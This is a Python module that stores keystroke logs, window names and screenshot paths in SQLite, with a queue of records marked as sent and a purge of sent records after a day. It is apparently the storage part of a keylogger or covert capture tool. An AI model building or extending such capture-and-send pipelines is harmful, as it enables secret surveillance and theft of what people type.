"""
SQLite-based structured storage for capture metadata.

Stores capture records (type, data, file path, timestamps) in a
queryable SQLite database. Useful for keystroke logs and metadata.

Usage:
    from storage.sqlite_storage import SQLiteStorage

    db = SQLiteStorage("./data/captures.db")
    row_id = db.insert("keystroke", data="hello world")
    pending = db.get_pending(limit=50)
    db.mark_sent([r["id"] for r in pending])
    db.close()
"""
from __future__ import annotations

import sqlite3
import time
import logging
from pathlib import Path

logger = logging.getLogger(__name__)


class SQLiteStorage:
    """Store capture metadata and small data blobs in SQLite."""

    def __init__(self, db_path: str = "./data/captures.db") -> None:
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(str(self.db_path), check_same_thread=False)
        self._conn.execute("PRAGMA journal_mode=WAL")  # Better concurrent access
        self._create_tables()
        logger.info("SQLite storage initialized: %s", self.db_path)

    def _create_tables(self) -> None:
        """Create tables and indexes if they don't exist."""
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT NOT NULL,
                data TEXT DEFAULT '',
                file_path TEXT DEFAULT '',
                file_size INTEGER DEFAULT 0,
                timestamp REAL NOT NULL,
                sent INTEGER DEFAULT 0
            );

            CREATE INDEX IF NOT EXISTS idx_captures_sent
                ON captures(sent);

            CREATE INDEX IF NOT EXISTS idx_captures_timestamp
                ON captures(timestamp);

            CREATE INDEX IF NOT EXISTS idx_captures_type
                ON captures(type);
        """)
        self._conn.commit()

    def insert(
        self,
        capture_type: str,
        data: str = "",
        file_path: str = "",
        file_size: int = 0,
    ) -> int:
        """
        Insert a capture record.

        Args:
            capture_type: Type of capture (e.g. "keystroke", "screenshot").
            data: Text data (keystrokes, window names, etc.).
            file_path: Path to associated file (screenshots, etc.).
            file_size: Size of associated file in bytes.

        Returns:
            The row ID of the inserted record.
        """
        cursor = self._conn.execute(
            "INSERT INTO captures (type, data, file_path, file_size, timestamp) "
            "VALUES (?, ?, ?, ?, ?)",
            (capture_type, data, file_path, file_size, time.time()),
        )
        self._conn.commit()
        return cursor.lastrowid

    def get_pending(self, limit: int = 50) -> list[dict]:
        """
        Get unsent captures, oldest first.

        Args:
            limit: Maximum number of records to return.

        Returns:
            List of dicts with keys: id, type, data, file_path, timestamp.
        """
        cursor = self._conn.execute(
            "SELECT id, type, data, file_path, file_size, timestamp "
            "FROM captures WHERE sent = 0 "
            "ORDER BY timestamp ASC LIMIT ?",
            (limit,),
        )
        columns = ["id", "type", "data", "file_path", "file_size", "timestamp"]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]

    def mark_sent(self, ids: list[int]) -> None:
        """Mark captures as successfully sent."""
        if not ids:
            return
        placeholders = ",".join("?" * len(ids))
        self._conn.execute(
            f"UPDATE captures SET sent = 1 WHERE id IN ({placeholders})",
            ids,
        )
        self._conn.commit()
        logger.debug("Marked %d records as sent", len(ids))

    def count_pending(self) -> int:
        """Count unsent captures."""
        cursor = self._conn.execute("SELECT COUNT(*) FROM captures WHERE sent = 0")
        return cursor.fetchone()[0]

    def count_total(self) -> int:
        """Count all captures."""
        cursor = self._conn.execute("SELECT COUNT(*) FROM captures")
        return cursor.fetchone()[0]

    def purge_sent(self, older_than_seconds: int = 86400) -> int:
        """
        Delete sent records older than a given age.

        Args:
            older_than_seconds: Delete records older than this (default 24h).

        Returns:
            Number of records deleted.
        """
        cutoff = time.time() - older_than_seconds
        cursor = self._conn.execute(
            "DELETE FROM captures WHERE sent = 1 AND timestamp < ?",
            (cutoff,),
        )
        self._conn.commit()
        deleted = cursor.rowcount
        if deleted:
            logger.info("Purged %d sent records older than %ds", deleted, older_than_seconds)
        return deleted

    def close(self) -> None:
        """Close the database connection."""
        self._conn.close()
        logger.debug("SQLite storage closed")

    def __enter__(self) -> SQLiteStorage:
        return self

    def __exit__(self, *args) -> None:
        self.close()
